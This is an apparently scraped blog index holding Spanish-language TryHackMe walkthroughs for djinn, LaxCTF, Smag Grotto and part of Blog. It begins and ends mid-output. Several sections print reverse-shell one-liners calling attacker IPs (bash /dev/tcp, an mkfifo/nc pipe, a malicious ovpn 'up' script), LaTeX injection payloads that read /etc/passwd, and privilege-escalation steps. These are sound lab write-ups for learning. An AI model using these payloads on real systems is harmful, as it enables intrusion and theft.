SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n SF:\\nLet\u0026#39;s\\x20see\\x20how\\x20good\\x20you\\x20are\\x20with\\x20simple\\x20maths\\ SF:nAnswer\\x20my\\x20questions\\x201000\\x20times\\x20and\\x20I\u0026#39;ll\\x20give\\x20y SF:ou\\x20your\\x20gift\\.\\n\\(7,\\x20\u0026#39;\\*\u0026#39;,\\x209\\)\\n\u0026gt;\\x20\u0026#34;)%r(RPCCheck,1BC,\u0026#34;\\x2 SF:0\\x20____\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_____\\x20_\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20/\\x20___\\|\\x20__\\x20_\\x20_\\x SF:20__\\x20___\\x20\\x20\\x20___\\x20\\x20\\|_\\x20\\x20\\x20_\\(_\\)_\\x20__\\x20___\\x SF:20\\x20\\x20___\\x20\\n\\|\\x20\\|\\x20\\x20_\\x20/\\x20_`\\x20\\|\\x20\u0026#39;_\\x20`\\x20_\\x SF:20\\\\\\x20/\\x20_\\x20\\\\\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\u0026#39;_\\x20`\\x20_\\x2 SF:0\\\\\\x20/\\x20_\\x20\\\\\\n\\|\\x20\\|_\\|\\x20\\|\\x20\\(_\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\| SF:\\x20\\|\\x20\\|\\x20\\x20__/\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20 SF:\\|\\x20\\|\\x20\\|\\x20\\x20__/\\n\\x20\\\\____\\|\\\\__,_\\|_\\|\\x20\\|_\\|\\x20\\|_\\|\\\\_ SF:__\\|\\x20\\x20\\x20\\|_\\|\\x20\\|_\\|_\\|\\x20\\|_\\|\\x20\\|_\\|\\\\___\\|\\n\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\nLet\u0026#39;s\\x2 SF:0see\\x20how\\x20good\\x20you\\x20are\\x20with\\x20simple\\x20maths\\nAnswer\\x2 SF:0my\\x20questions\\x201000\\x20times\\x20and\\x20I\u0026#39;ll\\x20give\\x20you\\x20your SF:\\x20gift\\.\\n\\(8,\\x20\u0026#39;\\+\u0026#39;,\\x206\\)\\n\u0026gt;\\x20\u0026#34;); Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 1 11:15:40 2020 -- 1 IP address (1 host up) scanned in 758.06 seconds   FTP En el puerto 21 FTP logramos ingresar como anonymous en donde encontramos tres archivos, uno que contiene lo que parece ser credenciales, el segundo un mensaje para @nitish81299 (nada interesante en Github y Twitter) y un posible nombre de usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  root@upset:~/thm/djinn# ftp djinn.thm Connected to djinn.thm. 220 (vsFTPd 3.0.3) Name (djinn.thm:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 115 4096 Oct 21 2019 . drwxr-xr-x 2 0 115 4096 Oct 21 2019 .. -rw-r--r-- 1 0 0 11 Oct 20 2019 creds.txt -rw-r--r-- 1 0 0 128 Oct 21 2019 game.txt -rw-r--r-- 1 0 0 113 Oct 21 2019 message.txt 226 Directory send OK. ftp\u0026gt; get creds.txt local: creds.txt remote: creds.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for creds.txt (11 bytes). 226 Transfer complete. 11 bytes received in 0.00 secs (54.5289 kB/s) ftp\u0026gt; get game.txt local: game.txt remote: game.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for game.txt (128 bytes). 226 Transfer complete. 128 bytes received in 0.00 secs (968.9923 kB/s) ftp\u0026gt; get message.txt local: message.txt remote: message.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for message.txt (113 bytes). 226 Transfer complete. 113 bytes received in 0.00 secs (144.6285 kB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/djinn# ls creds.txt game.txt message.txt nmap_scan_mini root@upset:~/thm/djinn# cat creds.txt nitu:[... REDACTED ...] root@upset:~/thm/djinn# cat message.txt @nitish81299 I am going on holidays for few days, please take care of all the work. And don\u0026#39;t mess up anything. root@upset:~/thm/djinn# cat game.txt oh and I forgot to tell you I\u0026#39;ve setup a game for you on port 1337. See if you can reach to the final level and get the prize. root@upset:~/thm/djinn#   HTTP Encontramos una pagina web en el puerto 7331.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3  root@upset:~/thm/djinn# gobuster dir -u http://djinn.thm:7331/ -w /usr/share/wordlists/dirbuster/directory-list-medium.txt -q -t 25 -x php,html,txt /wish /genie   WWW-DATA - USER Encontramos una pagina /wish donde al ingresar un comando, este se ejecuta pero el resultado lo muestra en una url redireccionada.\nEjecutamos una shell codificada:\n1 2 3 4  #Shell echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; |base64 #Ejecutamos echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC8xMzM4IDA+JjEi|base64 -d|bash   Obtenemos una shell con el usuario www-data.\nNITISH - USER En el archivo app.py el cual ejecuta la pagina anterior encontramos una direccion a un archivo, este archivo contiene lo que parecen credenciales del usuario nitish.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  import subprocess from flask import Flask, redirect, render_template, request, url_for app = Flask(__name__) app.secret_key = \u0026#34;key\u0026#34; + CREDS = \u0026#34;/home/nitish/.dev/creds.txt\u0026#34; RCE = [\u0026#34;/\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;^\u0026#34;, \u0026#34;$\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;;\u0026#34;] def validate(cmd): if CREDS in cmd and \u0026#34;cat\u0026#34; not in cmd: return True try: for i in RCE: for j in cmd: if i == j: return False return True except Exception: return False @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def index(): return render_template(\u0026#34;main.html\u0026#34;) @app.route(\u0026#34;/wish\u0026#34;, methods=[\u0026#39;POST\u0026#39;, \u0026#34;GET\u0026#34;]) def wish(): execute = request.form.get(\u0026#34;cmd\u0026#34;) if execute: if validate(execute): output = subprocess.Popen(execute, shell=True, stdout=subprocess.PIPE).stdout.read() else: output = \u0026#34;Wrong choice of words\u0026#34; return redirect(url_for(\u0026#34;genie\u0026#34;, name=output)) else: return render_template(\u0026#39;wish.html\u0026#39;) @app.route(\u0026#39;/genie\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def genie(): if \u0026#39;name\u0026#39; in request.args: page = request.args.get(\u0026#39;name\u0026#39;) else: page = \u0026#34;It\u0026#39;s not that hard\u0026#34; return render_template(\u0026#39;genie.html\u0026#39;, file=page) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=True)   Utilizamos la contraseña con el usuario y logramos obtener una shell con el usuario nitish y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando genie esto con el usuario sam sin contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  nitish@djinn:~$ sudo -l -l sudo -l -l Matching Defaults entries for nitish on djinn: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User nitish may run the following commands on djinn: Sudoers entry: RunAsUsers: sam Options: !authenticate Commands: /usr/bin/genie nitish@djinn:~$   Otro de los hallazgos que hicimos es un archivo de configuracion de knock\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  nitish@djinn:/etc$ cat knockd.conf cat knockd.conf [options] UseSyslog [openSSH] sequence = 1356, 6784, 3409 seq_timeout = 5 command = /sbin/iptables -I INPUT 1 -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 3409, 6784, 1356 seq_timeout = 5 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn   Utilizamos la secuencia para obtener una shell en SSH.\nAhora si, seguimos investigando sobre /usr/bin/genie, le pasamos los parametros que pide este ejecutable, esperando a que ejecute nuestro comando, pero al parecer no se agrega en ningun tipo de cron o proceso\n1 2 3 4  nitish@djinn:/etc$ /usr/bin/genie -p bash -g -e \u0026#34;ping -c 5 10.2.29.162\u0026#34; wish /usr/bin/genie -p bash -g -e \u0026#34;ping -c 5 10.2.29.162\u0026#34; wish We\u0026#39;ve added your wish to our records. Continue praying!!   En la documentacion de este ejecutable encontramos un parametro que no aparece en el ejecutable al mostrar la ayuda (-h), agregamos este parametro junto al usuario sam. Logramos obtener una shell con este ultimo usuario. Hicimos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando lago.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd gg my man!! $ whoami sam $ sudo -l -l Matching Defaults entries for sam on djinn: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User sam may run the following commands on djinn: Sudoers entry: RunAsUsers: root Options: !authenticate Commands: /root/lago $   Ejecutamos este comando y nos muestra diferentes opciones pero ninguna de estas nos deja escalar privilegios. En la carpeta de este usuario encontramos un archivo .pyc el cual al leer las strings encontramos las mismas que el comando lago muestra.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  $ strings .pyc getuser( system( randintc Working on it!! ( /home/mzfr/scripts/exp.pyt naughtyboi Choose a number between 1 to 100: s Enter your number: s /bin/shs Better Luck next time( inputR numt /home/mzfr/scripts/exp.pyt [... REDACTED ...]   Copiamos este archivo a nuestra maquina y utilizamos uncompyle6. Vemos en el codigo fuente, especificamente en la fucnion guessit() vemos que hace una comparacion de la variable s con num, en el input no realiza ninguna validacion de si lo ingresado es un entero o string, en esta funcion al adivinar el numero devuelve una shell con usuario root. Para poder aprovecharnos de este script vamos a ingresar el nombre de la variable num ya que la variable s no tiene ningun tipo de validacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  # uncompyle6 version 3.7.3 # Python bytecode 2.7 (62211) # Decompiled from: Python 3.8.2 (default, Apr 1 2020, 15:52:55) # [GCC 9.3.0] # Embedded file name: /home/mzfr/scripts/exp.py # Compiled at: 2019-11-07 07:05:18 from getpass import getuser from os import system from random import randint def naughtyboi(): print \u0026#39;Working on it!!\u0026#39; def guessit(): num = randint(1, 101) print \u0026#39;Choose a number between 1 to 100: \u0026#39; s = input(\u0026#39;Enter your number: \u0026#39;) if s == num: system(\u0026#39;/bin/sh\u0026#39;) else: print \u0026#39;Better Luck next time\u0026#39; [... REDACTED ...] if __name__ == \u0026#39;__main__\u0026#39;: main(options()) # okay decompiling file_pyc.pyc   Logramos obtener nuestra shell con usuario root y flag user.txt.\n","description":"","id":4,"section":"posts","tags":["linux"],"title":"TryHackMe - djinn","uri":"https://sckull.github.io/posts/djinn/"},{"content":"LaxCTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo LaxCTF     Info Try Harder!   Puntos 60   Dificultad Media   Maker stuxnet    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Wed Jul 29 19:15:28 2020 as: nmap -sV -o nmap_scan_mini lax.thm Nmap scan report for lax.thm (10.10.90.68) Host is up (0.27s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 29 19:16:41 2020 -- 1 IP address (1 host up) scanned in 72.59 seconds   HTTP Encontramos una pagina web en el puerto 80.\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  root@upset:~/thm/lax# /opt/rustbuster/rustbuster dir -e php,html,txt -t 250 -u http://lax.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2020-07-29 20:57:11 GET\t200 OK\thttp://lax.thm/ GET 403 Forbidden http://lax.thm/.html GET 403 Forbidden http://lax.thm/.php GET 200 OK http://lax.thm/index.php GET 301 Moved Permanently http://lax.thm/pdf =\u0026gt; http://lax.thm/pdf/ GET 301 Moved Permanently http://lax.thm/templates =\u0026gt; http://lax.thm/templates/ GET 301 Moved Permanently http://lax.thm/assets =\u0026gt; http://lax.thm/assets/ GET 200 OK http://lax.thm/ajax.php GET 301 Moved Permanently http://lax.thm/javascript =\u0026gt; http://lax.thm/javascript/ GET 200 OK http://lax.thm/config.php GET 200 OK http://lax.thm/flag.php GET 301 Moved Permanently http://lax.thm/compile =\u0026gt; http://lax.thm/compile/ GET 301 Moved Permanently http://lax.thm/Google-Earth =\u0026gt; http://lax.thm/Google-Earth/ GET 200 OK http://lax.thm/ GET 403 Forbidden http://lax.thm/.php GET 403 Forbidden http://lax.thm/.html C^   LaTeX - EXPLOIT En la pagina encontramos pdfTeX para generar PDF a partir de un template y texto ingresado, ingresamos un texto cualquiera y nos devuelve la direccion en donde se encuentra el PDF. Además la version de pdfTeX Version 3.14159265-2.6-1.40.16\nEn la direccion, el PDF con el texto ingresado.\nCon el siguiente \u0026ldquo;payload\u0026rdquo; logramos obtener la primera linea del archivo /etc/passwd\n1 2 3 4 5  \\newread\\file \\openin\\file=/etc/passwd \\read\\file to\\line \\text{\\line} \\closein\\file   Intentamos utilizar el mismo payload que utilizamos en CHAOS - HTB pero al parecer tiene un blacklist parecido a este:\n1  \u0026#34;(input|include|write18|immediate)\u0026#34;   Por lo que no es posible utilizar los \u0026ldquo;comandos\u0026rdquo; conocidos. Probamos diferentes combinaciones pero ninguna de estas combinaciones funcionó. Reallizamos una busqueda de un posible exploit en google y encontramos un PoC en Moodle \u0026lt; 1.6.9/1.7.7/1.8.9/1.9.5 - File Disclosure donde indica como es posible leer archivos a traves del siguiente payload:\n1  \u0026#34;$$\\input{/etc/passwd} $$\u0026#34;   Logramos leer el archivo e incrustarlo en el PDF:\nAdemás, dentro de la respuesta al enviar el PoC encontramos el contenido del archivo /etc/passwd con la informacion desordenada, donde logramos ver uno de los usuarios con su directorio principal y una carpeta no muy comun dentro de este archivo. Uno de los usuarios es Lax o king (Lax puede referirse al hostname) y su carpeta principal se encuentra en /home/king, el otro directorio es /opt/secret.\nUtilizando el directorio principal del usuario que encontramos podemos leer nuestra flag user.txt.\n1  \u0026#34;$$\\input{/home/king/user.txt} $$\u0026#34;   Hicimos lo mismo con /opt/secret pero a un principio no tenia nada en su interior, pero al inspeccionar el codigo fuente encontramos strings separadas por etiquetas HTML.\nUtilizamos HTML-strip para poder eliminar las etiquetas y obtener el texto completo, además eliminamos todos los espacios existentes y caracteres al inicio y al final \u0026quot; y 1. Logramos leer lo que parece una encriptacion AES en modo CBC pero para obtener el texto necesitamos KEY e IV.\n1 2 3  AES/CBC/128d2X+7fLZAq4as9qs7yGRdWANgbFVDaly2j2TjnKbeCq8bH3iR2XpyXBVjSCsrGLmTAhyffVoOgbhmVl5vDDMNvC6wJNfEZWa+MkF8HGQBcrE9pYSHag8jxC4vFwyINMOq53YR2GXUZFvA/qipjUStx3N69Wc7f3QpDVKRmGudEPhw0AMnnbICAvCNPoXIdyOK3I2zKM+za8z7+7V6Ut5gWCKQezKa+l91GNQWj1iUKU0rlzTmr49Fkcwlw01E0tr3DqQv8BV0V3eCs7mRnUCzdW4tnRH9J9eP7likT [... REDACTED ...] g9bmi7WpLL/+UMWNYMetCj52lDgLyisn9B+0/W0/Tfd7qn5SLILAVrMICIYIfVWWsELCTIYTuLEpdo+HVAfxfh8RB3pZ3cG+uzCe1xSMcx0JfSld1Hfa3hJK75zVWwcfu4EvVZ1ghlZwtm7Ls=   KING - USER APK Encontramos un apk en /Google-Earth/ y utilizamos jadx para leer el codigo fuente de la aplicacion, en donde encontramos funciones para encriptar y desencriptar, además encontramos el IV y KEY.\nUtilizamos CyberChef para desencriptar el texto (eliminamos AES/CBC/128).\nEl texto esta codificado en brainfuck, utilizamos dcode.fr\nNuevamente utilizamos CyberChef para obtener lo que parecen credenciales del usuario king.\nLogramos obtener una shell con el usuario King.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con pspy y encontramos que se ejecuta un cron, el problema es de que no sabemos cual es el contenido de dicho archivo (run.sh).\nEn el directorio principal de king encontramos un archivo ovpn por lo que agregamos una shell inversa al igual que en VAULT - HTB esperando a alguna conexion a nuestra maquina.\n1 2 3 4 5  remote 10.10.90.68 dev tun nobind script-security 2 up \u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.1/1338 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;   Logramos obtener una shell con usuario root y nuestra flag root.txt.\nRevisamos el archivo run.sh y es el que ejecutó el archivo ovpn.\n1  openvpn /home/king/tryhackme.ovpn   Payloads - Latex Injection\n","description":"","id":5,"section":"posts","tags":["linux"],"title":"TryHackMe - LaxCTF","uri":"https://sckull.github.io/posts/laxctf/"},{"content":"Smag Grotto es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Smag Grotto     Info Do you remember how to analyse packets?   Puntos 160   Dificultad Facil   Maker JakeDoesSec    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Wed Jul 29 17:29:14 2020 as: nmap -sV -o nmap_scan_mini smag.thm Nmap scan report for smag.thm (10.10.138.62) Host is up (0.26s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 29 17:29:58 2020 -- 1 IP address (1 host up) scanned in 44.14 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3  root@upset:~/thm/smag# gobuster dir -u http://smag.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.php (Status: 200) /mail (Status: 301)   WWW-DATA - USER Encontramos la pagina /mail donde vemos algunos correos, en uno de ellos un archivo pcap.\nAnalizamos el archivo y encontramos credenciales, además de ello un subdominio.\n1 2 3 4 5 6 7 8 9 10 11 12  POST /login.php HTTP/1.1 Host: development.smag.thm User-Agent: curl/7.47.0 Accept: */* Content-Length: 39 Content-Type: application/x-www-form-urlencoded username=help[... REDACTED ...]\u0026amp;password=cH4nG3M3_[... REDACTED ...]HTTP/1.1 200 OK Date: Wed, 03 Jun 2020 18:04:07 GMT Server: Apache/2.4.18 (Ubuntu) Content-Length: 0 Content-Type: text/html; charset=UTF-8   Agregamos el subdominio en nuestro archivo /etc/hosts. Visitamos el puerto 80 y encontramos archivos css y php.\nUtilizamos las credenciales en el panel de login.php donde logramos obtener acceso a una pagina para ingresar comandos.\nEnviamos un ping hacia nuestra maquina y logramos obtener paquetes desde la maquina (smag.thm).\nEjecutamos la siguiente shell inversa con nuestra IP y PUERTO para obtener una shell con el usuario www-data.\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.0.0.0 1338 \u0026gt;/tmp/f   USER - JAKE Dentro de la maquina, enumeramos los directorios, en /opt/ encontramos un directorio con un archivo que contiene la clave publica (id_rsa.pub) del usuario jake.\nRevisamos los crons de la maquina y encontramos que el contenido de este ultimo archivo se agrega al archivo authorized_keys del usuario jake, por lo que podemos agregar nuestra clave publica al archivo /opt/.backups/jake_id_rsa.pub.backup para poder ingresar en el servicio SSH utilizando el usuario Jake.\nAuthorized_Keys - SSH\nAgregamos nuestra clave publica y esperamos hasta que se agregue en el archivo de Jake.\nIngresamos con el usuario Jake en SSH sin ninguna contraseña, y logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando apt-get. Utilizamos apt-get para obtener una shell root y nuestra flag root.txt.\n","description":"","id":6,"section":"posts","tags":["linux"],"title":"TryHackMe - Smag Grotto","uri":"https://sckull.github.io/posts/smag/"},{"content":"Blog es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Blog     Info Billy Joel made a Wordpress blog!   Puntos 350   Dificultad Media   Maker Nameless0ne    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # Nmap 7.80 scan initiated Thu Jul 23 16:31:53 2020 as: nmap -sV -o nmap_scan_mini blog.thm Nmap scan report for blog.thm (10.10.91.166) Host is up (0.26s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 23 16:32:56 2020 -- 1 IP address (1 host up) scanned in 63.00 seconds   SAMBA Utilizamos smbclient para enumerar los SHARENAMES, encontramos BillySMB en el cual logramos descargar algunos archivos multimedia.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  root@upset:~/thm/blog# smbclient -L blog.thm Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers BillySMB Disk Billy\u0026#39;s local SMB Share IPC$ IPC IPC Service (blog server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available root@upset:~/thm/blog# smbclient \\\\\\\\blog.thm\\\\BillySMB Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Tue May 26 13:17:05 2020 .. D 0 Tue May 26 12:58:23 2020 Alice-White-Rabbit.jpg N 33378 Tue May 26 13:17:01 2020 tswift.mp4 N 1236733 Tue May 26 13:13:45 2020 check-this.png N 3082 Tue May 26 13:13:43 2020 15413192 blocks of size 1024. 9788768 blocks available smb: \\\u0026gt; get Alice-White-Rabbit.jpg getting file \\Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (18.8 KiloBytes/sec) (average 18.8 KiloBytes/sec) smb: \\\u0026gt; get check-this.png getting file \\check-this.png of size 3082 as check-this.png (2.5 KiloBytes/sec) (average 12.2 KiloBytes/sec) smb: \\\u0026gt; get tswift.mp4 getting file \\tswift.mp4 of size 1236733 as tswift.mp4 (110.8 KiloBytes/sec) (average 89.9 KiloBytes/sec) smb: \\\u0026gt;   Archivos encontrados:\nUtilizamos steghide en el archivo JPG para verificar si tenian archivos ocultos, pero solo fuimos trolleados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  root@upset:~/thm/blog# steghide Alice-White-Rabbit.jpg steghide: unknown command \u0026#34;Alice-White-Rabbit.jpg\u0026#34;. steghide: type \u0026#34;steghide --help\u0026#34; for help. root@upset:~/thm/blog# steghide info Alice-White-Rabbit.jpg \u0026#34;Alice-White-Rabbit.jpg\u0026#34;: format: jpeg capacity: 1.8 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026#34;rabbit_hole.txt\u0026#34;: size: 48.0 Byte encrypted: rijndael-128, cbc compressed: yes root@upset:~/thm/blog# steghide extract -sf Alice-White-Rabbit.jpg Enter passphrase: wrote extracted data to \u0026#34;rabbit_hole.txt\u0026#34;. root@upset:~/thm/blog# cat rabbit_hole.txt You\u0026#39;ve found yourself in a rabbit hole, friend.   El archivo QR al escanearlo nos devuelve una URL, esta url nos redirige a un video de youtube.\nHTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, vemos que tiene directorios que pertenecen a Wordpress.\nroot@upset:~/thm/blog# gobuster dir -u http://blog.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /rss (Status: 301) /index.php (Status: 301) /login (Status: 302) /0 (Status: 301) /feed (Status: 301) /atom (Status: 301) /wp-content (Status: 301) /admin (Status: 302) /welcome (Status: 301) /wp-login.php (Status: 200) /n (Status: 301) /w (Status: 301) /rss2 (Status: 301) /license.txt (Status: 200) /wp-includes (Status: 301) /readme.html (Status: 200) /wp-register.php (Status: 301) /no (Status: 301) /wp-rss2.php (Status: 301) /rdf (Status: 301) /page1 (Status: 301) /robots.txt (Status: 200) /' (Status: 301) /dashboard (Status: 302) /note (Status: 301) /%20 (Status: 301) WPSCAN Utilizamos wpscan para enumerar version, usuarios, plugins y temas vulnerables de Wordpress. Encontramos dos usuarios registrados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106  [+] URL: http://blog.thm/ [+] Started: Thu Jul 23 16:52:47 2020 Interesting Finding(s): [+] http://blog.thm/ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] http://blog.thm/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] http://blog.thm/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] http://blog.thm/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] http://blog.thm/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Rss Generator (Passive Detection) | - http://blog.thm/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.0\u0026lt;/generator\u0026gt; | - http://blog.thm/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.0\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://blog.thm/wp-content/themes/twentytwenty/ | Last Updated: 2020-06-10T00:00:00.000Z | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 1.4 | Style URL: 